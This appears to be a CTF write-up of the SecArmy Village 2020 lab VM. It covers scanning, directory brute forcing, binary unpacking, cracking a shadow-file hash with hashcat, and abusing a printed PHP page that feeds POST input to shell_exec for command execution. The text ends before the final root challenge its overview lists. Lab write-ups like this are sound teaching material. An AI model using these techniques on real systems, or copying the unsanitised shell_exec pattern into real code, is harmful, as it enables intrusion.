# SecArmy Village 2020 CTF - OSCP Giveaway:

## Description:

This CTF was announced by [SECARMY](https://secarmy.org/village) and sponsered by [offensive security](https://www.offensive-security.com/). You are provided with a vulnerable OVA machine, the goal is to complete a series of challenges and reach the `root` user.

### Overview (TL;DR):

1. Hidden directory at HTTP service
2. `grep` magic and base64 encoded zip file
3. Super Secret Token for service running on 1337
4. Simple reverse engineering of binary `secarmy-village`
5. QR code reading in `CyberChef`
6. Hunting for a user-owned directory & Cracking a hash
7. Exploiting a vulnerable web application and gaining RCE
8. Decoding the password for a compressed ZIP file
9. Analysis of a PCAP file & decoding a `keyboard shift cipher`
10. PWN setuid binary to gain `root`

## Nmap Scan:

```
# Nmap 7.91 scan initiated Thu Oct 29 02:50:41 2020 as: nmap -sC -sV -oN nmap/ubuntu.nmap -p- -v 192.168.1.4
Nmap scan report for 192.168.1.4
Host is up (0.00034s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2c:54:d0:5a:ae:b3:4f:5b:f8:65:5d:13:c9:ee:86:75 (RSA)
|   256 0c:2b:3a:bd:80:86:f8:6c:2f:9e:ec:e4:7d:ad:83:bf (ECDSA)
|_  256 2b:4f:04:e0:e5:81:e4:4c:11:2f:92:2a:72:95:58:4e (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Totally Secure Website
1337/tcp open  waste?
| fingerprint-strings: 
|   NCP: 
|     Welcome to SVOS Password Recovery Facility!
|_    Enter the super secret token to proceed:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.91%I=7%D=10/29%Time=5F9A66CD%P=x86_64-pc-linux-gnu%r(N
SF:CP,58,"\n\x20Welcome\x20to\x20SVOS\x20Password\x20Recovery\x20Facility!
SF:\n\x20Enter\x20the\x20super\x20secret\x20token\x20to\x20proceed:\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 29 02:53:51 2020 -- 1 IP address (1 host up) scanned in 190.31 seconds
```

From the above nmap scan we have 4 ports open:
1. FTP on 21
2. SSH on 22
3. HTTP on 80
4. Custom made service on 1337 (Waste?)

The `FTP` service on 21 allows anonymous login. When we do anonymous login, we get emptiness... _le sad!_

Let's check HTTP then.

## UNO - HTTP Service: 

Going to the url `http://192.168.1.4`, we get the following text and nothing else:

```
Welcome to the first task!

You are required to find our hidden directory and make your way into the machine.
G00dluck! 
```

From the message, we can deduce that we need to perform a directory bruteforce attack. Running a quick `dirb http://192.168.1.4` we get the following results:

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Oct 30 06:08:54 2020
URL_BASE: http://192.168.1.4/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.4/ ----
==> DIRECTORY: http://192.168.1.4/anon/                                                                         
+ http://192.168.1.4/index.html (CODE:200|SIZE:267)                                                             
==> DIRECTORY: http://192.168.1.4/javascript/                                                                   
+ http://192.168.1.4/server-status (CODE:403|SIZE:276)                                                          
                                                                                                                
---- Entering directory: http://192.168.1.4/anon/ ----
+ http://192.168.1.4/anon/index.html (CODE:200|SIZE:293)
```

Let's check `http://192.168.1.4/anon/index.html` ...

```
Welcome to the hidden directory!

Here are your credentials to make your way into the machine! 
```

Hmm... Let's view the page's source code ...

```html
<html>
<head>
<title>Totally Secret Directory</title>
</head>
<body>
<center><b style="font-size: 32px;">Welcome to the hidden directory! <br>
<br>
Here are your credentials to make your way into the machine!
<br>
<br>
<font color="white">uno:luc10r4m0n</font>
</b></center>
</body>
</html>
```
We get the first set of credentials `uno:luc10r4m0n`. Let's try them out on `ssh`

```
kali@kali:~/Documents/secarmyctf$ ssh uno@192.168.1.4
uno@192.168.1.4's password: luc10r4m0n
 ________  _______   ________  ________  ________  _____ ______       ___    ___ 
|\   ____\|\  ___ \ |\   ____\|\   __  \|\   __  \|\   _ \  _   \    |\  \  /  /|
\ \  \___|\ \   __/|\ \  \___|\ \  \|\  \ \  \|\  \ \  \\\__\ \  \   \ \  \/  / /
 \ \_____  \ \  \_|/_\ \  \    \ \   __  \ \   _  _\ \  \\|__| \  \   \ \    / / 
  \|____|\  \ \  \_|\ \ \  \____\ \  \ \  \ \  \\  \\ \  \    \ \  \   \/  /  /  
    ____\_\  \ \_______\ \_______\ \__\ \__\ \__\\ _\\ \__\    \ \__\__/  / /    
   |\_________\|_______|\|_______|\|__|\|__|\|__|\|__|\|__|     \|__|\___/ /     
   \|_________|                                                     \|___|/      
                                                                                 
                                                                                 
 ___      ___ ___  ___       ___       ________  ________  _______               
|\  \    /  /|\  \|\  \     |\  \     |\   __  \|\   ____\|\  ___ \              
\ \  \  /  / | \  \ \  \    \ \  \    \ \  \|\  \ \  \___|\ \   __/|             
 \ \  \/  / / \ \  \ \  \    \ \  \    \ \   __  \ \  \  __\ \  \_|/__           
  \ \    / /   \ \  \ \  \____\ \  \____\ \  \ \  \ \  \|\  \ \  \_|\ \          
   \ \__/ /     \ \__\ \_______\ \_______\ \__\ \__\ \_______\ \_______\         
    \|__|/       \|__|\|_______|\|_______|\|__|\|__|\|_______|\|_______|         
                                                                                 

uno@svos:~$ ls
flag1.txt  readme.txt
uno@svos:~$ cat flag1.txt ; cat readme.txt 
Congratulations!
Here's your first flag segment: flag1{fb9e88}


Head over to the second user!
You surely can guess the username , the password will be:
4b3l4rd0fru705
```
uno --> `flag1{fb9e88}`


## DOS - `grep` magic and base64 encoded zip file:

Let's head to the second user like we got from the previous `readme.txt`.

```
uno@svos:~$ su dos
Password: 4b3l4rd0fru705
dos@svos:/home/uno$ cd
dos@svos:~$ ls
1337.txt  files  readme.txt
dos@svos:~$ cat 1337.txt ; cat readme.txt 
Our netcat application is too 1337 to handle..

You are required to find the following string inside the files folder:
a8211ac1853a1235d48829414626512a
dos@svos:~$
```

We have a directory called `files` and the `readme.txt` is telling us to look for the string `a8211ac1853a1235d48829414626512a` inside that directory. So let's do that with some `grep` magic.

```
dos@svos:~/files$ grep --color=auto 'a8211ac1853a1235d48829414626512a' ./*
./file4444.txt:a8211ac1853a1235d48829414626512a
dos@svos:~/files$
```

We found the file that contains our string, the file is `file4444.txt`. Let's read its content ...

```
dos@svos:~/files$ cat file4444.txt

...some junk...

a8211ac1853a1235d48829414626512a
Look inside file3131.txt
```
Okay, lets look at `file3131.txt` ...

```
dos@svos:~/files$ cat file3131.txt

...some junk...

UEsDBBQDAAAAADOiO1EAAAAAAAAAAAAAAAALAAAAY2hhbGxlbmdlMi9QSwMEFAMAAAgAFZI2Udrg
tPY+AAAAQQAAABQAAABjaGFsbGVuZ2UyL2ZsYWcyLnR4dHPOz0svSiwpzUksyczPK1bk4vJILUpV
L1aozC8tUihOTc7PS1FIy0lMB7LTc1PzSqzAPKNqMyOTRCPDWi4AUEsDBBQDAAAIADOiO1Eoztrt
dAAAAIEAAAATAAAAY2hhbGxlbmdlMi90b2RvLnR4dA3KOQ7CMBQFwJ5T/I4u8hrbdCk4AUjUXp4x
IsLIS8HtSTPVbPsodT4LvUanUYff6bHd7lcKcyzLQgUN506/Ohv1+cUhYsM47hufC0WL1WdIG4WH
80xYiZiDAg8mcpZNciu0itLBCJMYtOY6eKG8SjzzcPoDUEsBAj8DFAMAAAAAM6I7UQAAAAAAAAAA
AAAAAAsAJAAAAAAAAAAQgO1BAAAAAGNoYWxsZW5nZTIvCgAgAAAAAAABABgAgMoyJN2U1gGA6WpN
3pDWAYDKMiTdlNYBUEsBAj8DFAMAAAgAFZI2UdrgtPY+AAAAQQAAABQAJAAAAAAAAAAggKSBKQAA
AGNoYWxsZW5nZTIvZmxhZzIudHh0CgAgAAAAAAABABgAAOXQa96Q1gEA5dBr3pDWAQDl0GvekNYB
UEsBAj8DFAMAAAgAM6I7USjO2u10AAAAgQAAABMAJAAAAAAAAAAggKSBmQAAAGNoYWxsZW5nZTIv
dG9kby50eHQKACAAAAAAAAEAGACAyjIk3ZTWAYDKMiTdlNYBgMoyJN2U1gFQSwUGAAAAAAMAAwAo
AQAAPgEAAAAA
```

Okay, the first thing I did when I found that big blob was checking it in [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Unzip('',false)&input=VUVzREJCUURBQUFBQURPaU8xRUFBQUFBQUFBQUFBQUFBQUFMQUFBQVkyaGhiR3hsYm1kbE1pOVFTd01FRkFNQUFBZ0FGWkkyVWRyZwp0UFkrQUFBQVFRQUFBQlFBQUFCamFHRnNiR1Z1WjJVeUwyWnNZV2N5TG5SNGRIUE96MHN2U2l3cHpVa3N5Y3pQSzFiazR2SklMVXBWCkwxYW96Qzh0VWloT1RjN1BTMUZJeTBsTUI3TFRjMVB6U3F6QVBLTnFNeU9UUkNQRFdpNEFVRXNEQkJRREFBQUlBRE9pTzFFb3p0cnQKZEFBQUFJRUFBQUFUQUFBQVkyaGhiR3hsYm1kbE1pOTBiMlJ2TG5SNGRBM0tPUTdDTUJRRndKNVQvSTR1OGhyYmRDazRBVWpVWHA0eApJc0xJUzhIdFNUUFZiUHNvZFQ0THZVYW5VWWZmNmJIZDdsY0tjeXpMUWdVTjUwNi9PaHYxK2NVaFlzTTQ3aHVmQzBXTDFXZElHNFdICjgweFlpWmlEQWc4bWNwWk5jaXUwaXRMQkNKTVl0T1k2ZUtHOFNqenpjUG9EVUVzQkFqOERGQU1BQUFBQU02STdVUUFBQUFBQUFBQUEKQUFBQUFBc0FKQUFBQUFBQUFBQVFnTzFCQUFBQUFHTm9ZV3hzWlc1blpUSXZDZ0FnQUFBQUFBQUJBQmdBZ01veUpOMlUxZ0dBNldwTgozcERXQVlES01pVGRsTllCVUVzQkFqOERGQU1BQUFnQUZaSTJVZHJndFBZK0FBQUFRUUFBQUJRQUpBQUFBQUFBQUFBZ2dLU0JLUUFBCkFHTm9ZV3hzWlc1blpUSXZabXhoWnpJdWRIaDBDZ0FnQUFBQUFBQUJBQmdBQU9YUWE5NlExZ0VBNWRCcjNwRFdBUURsMEd2ZWtOWUIKVUVzQkFqOERGQU1BQUFnQU02STdVU2pPMnUxMEFBQUFnUUFBQUJNQUpBQUFBQUFBQUFBZ2dLU0JtUUFBQUdOb1lXeHNaVzVuWlRJdgpkRzlrYnk1MGVIUUtBQ0FBQUFBQUFBRUFHQUNBeWpJazNaVFdBWURLTWlUZGxOWUJnTW95Sk4yVTFnRlFTd1VHQUFBQUFBTUFBd0FvCkFRQUFQZ0VBQUFBQQ). The website detected that this blob was a compressed `zip` file in `base64` format. So, let's decode it and direct the output to a file called `output.zip`


```
kali@kali:~/Documents/secarmyctf$ echo 'UEsDBBQDAAAAADOiO...' | base64 -d > output.zip
kali@kali:~/Documents/secarmyctf$ file output.zip 
output.zip: Zip archive data, at least v?[0x314] to extract
kali@kali:~/Documents/secarmyctf$ zip -sf output.zip 
Archive contains:
  challenge2/
  challenge2/flag2.txt
  challenge2/todo.txt
Total 3 entries (194 bytes)
kali@kali:~/Documents/secarmyctf$
```
Let's extract the zip file with `unzip output.zip` and we will get a new directory called `challenge2`. That directory contains the second flag `flag2.txt` and instructions for the next challenge in `todo.txt`

```
kali@kali:~/Documents/secarmyctf/challenge2$ cat flag2.txt ; cat todo.txt
Congratulations!
Here's your second flag segment: flag2{624a21}
 
Although its total WASTE but... here's your super secret token: c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b
```
Dos --> `flag2{624a21}`

`WASTE` was the name identified by `nmap` for the service running on port 1337. Let's check that out!

## Tres - Custom Service on Port 1337:

```
dos@svos:~/files$ nc localhost 1337

 Welcome to SVOS Password Recovery Facility!
 Enter the super secret token to proceed: c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b

 Here's your login credentials for the third user tres:r4f43l71n4j3r0 

dos@svos:~/files$ 
```
That was easy! The lesson to learn from this challenge is to stay focused and do your recon well. Without analyzing the `nmap` result carefully we wouldn't have known that `waste` is the service running on port 1337. 

With that we get the credentials for the third user `tres:r4f43l71n4j3r0`.

```
dos@svos:~/files$ su tres
Password: r4f43l71n4j3r0
tres@svos:/home/dos/files$ cd
tres@svos:~$ ls
flag3.txt  readme.txt  secarmy-village
tres@svos:~$ cat flag3.txt ; cat readme.txt 
Congratulations!
Here's your third flag segment: flag3{ac66cf}

A collection of conditionals has been added in the secarmy-village binary present in this folder reverse it and get the fourth user's credentials. 
tres@svos:~$ file secarmy-village
secarmy-village: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), statically linked, stripped
```

Tres --> `flag3{ac66cf}`

We get the instructions for the next challenge in the `readme.txt`. Indicating that we need to reverse the binary `secarmy-village` to get the credentials for the fourth user.

## Cuatro - Simple Reverse Engineering:

Let's download the binary to our box for analysis, `scp` should do the trick...

```
kali@kali:~/Documents/secarmyctf/tres$ scp tres@192.168.1.4:~/secarmy-village ./secarmy-village
tres@192.168.1.4's password: 
secarmy-village                                                                100%   20KB   1.2MB/s   00:00    
kali@kali:~/Documents/secarmyctf/tres$ ls
secarmy-village
kali@kali:~/Documents/secarmyctf/tres$ file secarmy-village 
secarmy-village: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), statically linked, no section header
```

Let's run the program to get a sense of how it operates.

>NOTE: The program does require libgo to execute, a simple `sudo apt install libgo16` will do the trick. 

```
kali@kali:~/Documents/secarmyctf/tres$ ./secarmy-village 
Welcome .......Please enter the key ===>  

hello
Please Try Again :(
```
The program requires a `key` from us, if its the wrong key then it will print out `"Please Try Again :("` and exists.

Invoking `strings secarmy-village` will give us something interesting ...

```
kali@kali:~/Documents/secarmyctf/tres$ strings secarmy-village 
UPX!
td7ha
/lib64
....junk....
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.95 Copyright (C) 1996-2018 the UPX Team. All Rights Reserved. $
....junk....
aC      ?y?
UPX!
UPX!
```
>`UPX` = Ultimate Packer for eXecutables.

This binary is packed using `UPX`, we need to unpack it or decompress it using the same program. A simple `upx -d secarmy-village` will do. 

Why? In order for us to use `ghidra` and look at the decompiled version of the code, we need to unpack it to the original size. 

```
kali@kali:~/Documents/secarmyctf/tres$ upx -d secarmy-village 
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     53496 <-     20348   38.04%   linux/amd64   secarmy-village

Unpacked 1 file.
```

Now, let's open `ghidra` and try to analyze this binary file. After importing the binary and letting `ghidra` run its scans on it, I started to search for strings that begin with `Please`. That led us to a function called `main.flag`, and it contains the credentials for the fourth user `cuatro:p3dr00l1v4r3z`

![rev](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Misc/images/SecArmyCTF/secarmy_village-reversing.PNG "no need to get the key")

```
tres@svos:~$ su cuatro
Password: p3dr00l1v4r3z
cuatro@svos:/home/tres$ cd
cuatro@svos:~$ ls
flag4.txt  todo.txt
cuatro@svos:~$ cat flag4.txt ; cat todo.txt 
Congratulations, 
here's your 4th flag segment: flag4{1d6b06}

We have just created a new web page for our upcoming platform, its a photo gallery. You can check them out at /justanothergallery on the webserver.
```

Cuatro --> `flag4{1d6b06}`

The hint for the next challenge in `todo.txt` stats that we need to revisit the website in a directory called `/justanothergallery`.


## Cinco - QR Codes Challenge:

Visiting the URL `http://192.168.1.4/justanothergallery`, we see a bunch of QR codes that are displayed via a carousel scroller.

![QR Challenge](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Misc/images/SecArmyCTF/secarmy-qr_challenge.PNG "Carousel style")

I decided to visit the `/var/www/html` directory in the server; since I already have a running `SSH` connection. I found the `justanothergallery` directory and it contains all the QR codes displayed in the previous URL, let's get them in to my box. 

```
kali@kali:~/Documents/secarmyctf/cuatro$ scp -r cuatro@192.168.1.4:/var/www/html/justanothergallery/qr ./qr
cuatro@192.168.1.4's password: 
image-7.png                                                                    100%  436   228.2KB/s   00:00    
image-54.png                                                                   100%  444   568.2KB/s   00:00    
image-33.png                                                                   100%  433   461.1KB/s   00:00
....
```

Now, let's go to `CyberChef` and upload that `qr` directory and use the `Parse QR Code` module to read through all the QR codes quickly.

After reading throught the output, we get the credentials `cinco:ruy70m35` in `image-53.png`...

![qr solved](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Misc/images/SecArmyCTF/secarmy-qr_challenge_solution.PNG "My complements to the Chef!")

```
cuatro@svos:/var/www/html/justanothergallery$ su cinco
Password: ruy70m35
cinco@svos:/var/www/html/justanothergallery$ cd
cinco@svos:~$ ls
flag5.txt  readme.txt
cinco@svos:~$ cat flag5.txt ; cat readme.txt 
Congratulations!
Here's your 5th flag segment: flag5{b1e870}

Check for Cinco's secret place somewhere outside the house
cinco@svos:~$
```

Cinco --> `flag5{b1e870}`


## Seis - Hunting for `Cinco`'s Directory and Hash Cracking:

Let's look for directories that belongs to `cinco` using some Bash-jutsu!

```
cinco@svos:~$ find / -type d -user cinco 2>/dev/null
/home/cinco
/home/cinco/.local
/home/cinco/.local/share
/home/cinco/.local/share/nano
... proc junk ...
/cincos-secrets
```

`/cincos-secrets` looks interesting. Inside it, there is a `shadow.bak` file that contains the password's hash for the next user `seis` and a hint that indicates we need to crack it using the wordlist `rockyou.txt`. 

```
cinco@svos:/cincos-secrets$ cat shadow.bak
... Junk ...
seis:$6$MCzqLn0Z2KB3X3TM$opQCwc/JkRGzfOg/WTve8X/zSQLwVf98I.RisZCFo0mTQzpvc5zqm/0OJ5k.PITcFJBnsn7Nu2qeFP8zkBwx7.:18532:0:99999:7:::
```

Searching in [hashcat exmaple-hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) for the type of hash, we can indicate that its a `sha512crypt $6$` hash.

Copy the hash `$6$MCz....Bwx7.` into a file and call it anything, mine is called `seis.hash`. 

I use `hashcat` to crack password hashes, so `hashcat -a 0 -m 1800 seis.hash /usr/share/wordlists/rockyou.txt` is the line we need.

```
kali@kali:~/Documents/secarmyctf/cinco$ hashcat -m 1800 seis.hash --show
$6$MCzqLn0Z2KB3X3TM$opQCwc/JkRGzfOg/WTve8X/zSQLwVf98I.RisZCFo0mTQzpvc5zqm/0OJ5k.PITcFJBnsn7Nu2qeFP8zkBwx7.:Hogwarts
```

>Because I already cracked it during the challenge, hashcat saved the result for me.

The password is `Hogwarts`. So, our new set of credentials is `seis:Hogwarts`.

```
cinco@svos:/cincos-secrets$ su seis
Password: Hogwarts
seis@svos:/cincos-secrets$ cd
seis@svos:~$ ls
flag6.txt  readme.txt
seis@svos:~$ cat flag6.txt ; cat readme.txt 
Congratulations! 
Here's your 6th flag segment: flag6{779a25}

head over to /shellcmsdashboard webpage and find the credentials!
```

Seis --> `flag6{779a25}`

Looks like the next challenge is going to be in the `/var/www/html` directory again.

## Siete - Vulnerable web application (RCE):

Visiting the URL `http://192.168.1.4/shellcmsdashboard`, we are greeted with a login page. At this point, we already have a working `SSH` connection, let's look at the source code of the application in `/var/www/html/shellcmsdashboard`

Reading the `index.php` we get the following info...

```php
seis@svos:/var/www/html/shellcmsdashboard$ cat index.php 
<html>
</body>
... HTML and CSS Junk ...
<?php
$user = $_POST["emanresu"];
$pass = $_POST["drowssap"];
if(strcmp($user,"admin") == 0){
  if(strcmp($pass,"qwerty")== 0){
   echo "<center>head over to /aabbzzee.php</center>";
 }
}
?>
</body>
</html>
```

It looks like we need to see `aabbzzee.php`, let's `cat` out its contents...

```php
... HTML and CSS junk ...
<?php
    if(isset($_POST['comm']))
    {
        $cmd = $_POST['comm'];
        echo "<center>";
        echo shell_exec($cmd);
        echo"</center>";
    }
?>
```

Okay, so it appears to be taking user input without sanitizing it, which is a bug and can cause us to execute arbitrary commands from that webpage. 

```
seis@svos:/var/www/html/shellcmsdashboard$ ls -la
total 24
drwxrwxrwx 2 root     root 4096 Oct 18 15:02 .
drwxr-xr-x 5 root     root 4096 Oct  8 17:51 ..
-rwxrwxrwx 1 root     root 1459 Oct  1 17:57 aabbzzee.php
-rwxrwxrwx 1 root     root 1546 Oct 18 15:02 index.php
--wx-wx-wx 1 www-data root   48 Oct  8 17:54 readme9213.txt
-rwxrwxrwx 1 root     root   58 Oct  1 17:37 robots.txt
```

That file called `readme9213.txt` looks interesting, but we cannot read it and the file is owned by the user `www-data`. If we check the running processes we will see that the apache web service is running as `www-data` user. 

```
seis@svos:/var/www/html/shellcmsdashboard$ ps aux | grep www
www-data  1388  0.0  1.4 332084 14176 ?        S    09:12   0:00 /usr/sbin/apache2 -k start
www-data  1389  0.0  0.9 331604  9952 ?        S    09:12   0:00 /usr/sbin/apache2 -k start
```

Here's the plan, we get RCE (Remote Code Execution) from the vulnerable php script running on the apache web server, from there we can change the `readme9213.txt` file to be world readable. 

![shellcms](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Misc/images/SecArmyCTF/secarmy-shellcms.PNG "Let me read plez!1")

After clicking on the `search` button...

```
seis@svos:/var/www/html/shellcmsdashboard$ ls -l readme9213.txt 
-rwxrwxrwx 1 www-data root 48 Oct  8 17:54 readme9213.txt
```

We have changed the permissions of the file to be readable. Let's see its content!

```
seis@svos:/var/www/html/shellcmsdashboard$ cat readme9213.txt 
password for the seventh user is 6u1l3rm0p3n473
```

Our new set of credentials is `siete:6u1l3rm0p3n473`.

```
siete@svos:~$ ls
flag7.txt  hint.txt  key.txt  message.txt  mighthelp.go  password.zip
siete@svos:~$ cat flag7.txt 
Congratulations!
Here's your 7th flag segment: flag7{d5c26a}
```

Siete --> `flag7{d5c26a}`

The next challenge is tricky but simple. We need to find the password for the zip file `password.zip` to be able to extract its contents.


## Ocho - Password protected ZIP (CyberChef Magic):

I was stuck in this challenge for a while trying to debug the `mighthelp.go` script and trying to figure out what the `hint.txt` actually meant.

```
siete@svos:~$ cat hint.txt 
Base 10 and Base 256 result in Base 256!
```

```go
siete@svos:~$ cat mighthelp.go 
package main
import(
        "fmt"
) 

func main() {
        var chars =[]byte{}
        str1 := string(chars)
        fmt.Println(str1)
}
```

Then I figured I should use `CyberChef` to try and figure out what these sequence of numbers, in `message.txt`, mean. I copy-pasted the number in `CyberChef` and used the `Magic` module with Depth of 3 (default) and checked the `intense mode`...

![Magic](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Misc/images/SecArmyCTF/secarmy-zip_password_magic.PNG "Magical Discovery")

Low and behold, `secarmyxoritup` is the decoded string from these numbers. Indicating that the correct [recipe](https://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)XOR(%7B'option':'UTF8','string':'x'%7D,'Standard',false)) was XOR-ing the ascii values with the key `x`; That key was in `key.txt`. 


Now, let's decompress that ZIP file and get the credentials for the next challenge.

```
siete@svos:~$ unzip password.zip 
Archive:  password.zip
[password.zip] password.txt password: secarmyxoritup
 extracting: password.txt            
siete@svos:~$ ls
flag7.txt  hint.txt  key.txt  message.txt  mighthelp.go  password.txt  password.zip
siete@svos:~$ cat password.txt 
the next user's password is m0d3570v1ll454n4
```

>`ocho:m0d3570v1ll454n4`

```
siete@svos:~$ su ocho
Password: m0d3570v1ll454n4
ocho@svos:/home/siete$ cd
ocho@svos:~$ ls
flag8.txt  keyboard.pcapng
ocho@svos:~$ cat flag8.txt 
Congratulations!
Here's your 8th flag segment: flag8{5bcf53}
```

Ocho --> `flag8{5bcf53}`

There's a `keyboard.pcapng` file. Looks like the next challenge is analyzing that `PCAP` file.

## Nueve - Analysis of a PCAP file & decoding a `keyboard shift cipher`:

Transfering `keyboard.pcapng` to our box, we can open it in wireshark. 

![Wireshark](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Misc/images/SecArmyCTF/secarmy-keyboard_challenge_wireshark.PNG "HTTP!")

There are a couple of HTTP, packets being sent. My first instinct was to `Export HTTP Objects` and see if we can extract anything interesting. 

> File > Export Objects > HTTP.. > Save All


```
kali@kali:~/Documents/secarmyctf/ocho$ ls
http_objects  keyboard.pcap
kali@kali:~/Documents/secarmyctf/ocho$ cd http_objects/
kali@kali:~/Documents/secarmyctf/ocho/http_objects$ ls
 %2f       '%2f(26)'  '%2f(44)'  '%2f(62)'  '%2f(80)'            'gts1o1core(14)'  'gts1o1core(32)'
'%2f(10)'  '%2f(28)'  '%2f(46)'  '%2f(64)'  '%2f(82)'            'gts1o1core(16)'  'gts1o1core(34)'
'%2f(12)'  '%2f(30)'  '%2f(48)'  '%2f(66)'  '%2f(84)'            'gts1o1core(18)'  'gts1o1core(4)'
'%2f(14)'  '%2f(32)'  '%2f(50)'  '%2f(68)'  '%2f(86)'            'gts1o1core(2)'   'gts1o1core(6)'
'%2f(16)'  '%2f(34)'  '%2f(52)'  '%2f(70)'   configurations      'gts1o1core(20)'  'gts1o1core(8)'
'%2f(18)'  '%2f(36)'  '%2f(54)'  '%2f(72)'  'configurations(2)'  'gts1o1core(22)'   none.txt
'%2f(2)'   '%2f(38)'  '%2f(56)'  '%2f(74)'   favicon.ico         'gts1o1core(24)'   robots.txt
'%2f(20)'  '%2f(4)'   '%2f(58)'  '%2f(76)'   gts1o1core          'gts1o1core(26)'
'%2f(22)'  '%2f(40)'  '%2f(6)'   '%2f(78)'  'gts1o1core(10)'     'gts1o1core(28)'
'%2f(24)'  '%2f(42)'  '%2f(60)'  '%2f(8)'   'gts1o1core(12)'     'gts1o1core(30)'
```

There are a lot of files extracted, let's run `file` on everyone and see if we have anything interesting in them.

```
kali@kali:~/Documents/secarmyctf/ocho/http_objects$ file *
... JUNK ...
configurations:    JSON data
configurations(2): JSON data
favicon.ico:       HTML document, ASCII text
... JUNK ...
none.txt:          UTF-8 Unicode text, with very long lines
robots.txt:        HTML document, ASCII text
```

So we managed to get two JSON files, two HTML document, and a very long text file `none.txt`. Let's save some time, `none.txt` is the interesting one.

After looking at that file, it appears to be talking about the `QWERTY keyboard format`. Searching for strings like `password`, `key`, `nueve` (the name for our next user), etc... will not be useful. Nevertheless, we will eventually see this string:

```
READING IS NOT IMPORTANT, HERE IS WHAT YOU WANT: "mjwfr?2b6j3a5fx/"
```

Giving the keyboard format nature of this very long text file, and the name of the pcap `keyboard.pcapng`, I googled the term `QWERTY keyboard decoder` and the first [link](https://www.dcode.fr/keyboard-shift-cipher) was enough to get to the next phase. 

I supplied the weird string `mjwfr?2b6j3a5fx/` and it got decoded to `nueve:355u4z4rc0` which is our final set of credentials. 

```
ocho@svos:~$ su nueve
Password: 355u4z4rc0
nueve@svos:/home/ocho$ cd
nueve@svos:~$ ls
flag9.txt  orangutan  readme.txt
nueve@svos:~$ cat flag9.txt
Congratulations!
Here's your 9th flag segment: flag9{689d3e}
```
```
nueve@svos:~$ cat readme.txt 

                                      ,╓╓╖╗╗╗╗╖╖╓,
                                ,╓╗╬╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫▓@╗,
                             ╓@▓╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫@╖
                          ,╗▓╫╫╫▓▀▓╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╬╣╫╫╫╫@,
                        ,#╫╫╫▓▓░░░░╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫Ñ░░░╣▓╫╫╫▌µ
                     ,╗▓╫╫╫╫▓▀░░░░░░╩╫╫Ñ╫╫╫╫╫╫╫╫░╫╫Ñ░░░░░░╠▓▓╫╫╫╫@µ
                   ╓╬╫╫╫╫╫╫▓▌░░░░░╩"``   ╙╫╫╫╫M   ``"╨╦░░░░╠▓▓╫╫╫╫╫▓╗
                 ╓╣╫╫╫╫╫╫╫▓▓░░░░╩  ,╦NÑÑNÑ░╫╫Ñ░NÑÑN╦╥  ╙░░░░╟▓▓╫╫╫╫╫╫╫W
               ,╬╫╫╫╫╫╫╫╫▓▓▌░░░╨  ╦░░░▄▓▓▄░░░░╠▓▓▓▄░░Ñ  1░░░░▓▓╫╫╫╫╫╫╫╫▓µ
              ╔╫╫╫╫╫╫╫╫╫╫▓▓▒░░░░╦N░░░╙████░░░░║███▌░░░╦╦N░░░░▓▓╫╫╫╫╫╫╫╫╫╫@
             ╬╫╫╫╫╫╫╫╫╫╫╫▓▓M░░░░░░░░░░░╠╠░░░░░░╙╠░░░░░░░░░░░░╣▓▓╫╫╫╫╫╫╫╫╫╫▓
            ╬╫╫╫╫╫╫╫╫╫╫╫╫▀░░░░░░░░░░░░░░░░╬╫╬╫░░░░░░░░░░░░░░░░╠▓╫╫╫╫╫╫╫╫╫╫╫╫,
           ╬╫╫╫╫╫╫╫╫╫╫╫▓Ñ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╣╫╫╫╫╫╫╫╫╫╫╫╫
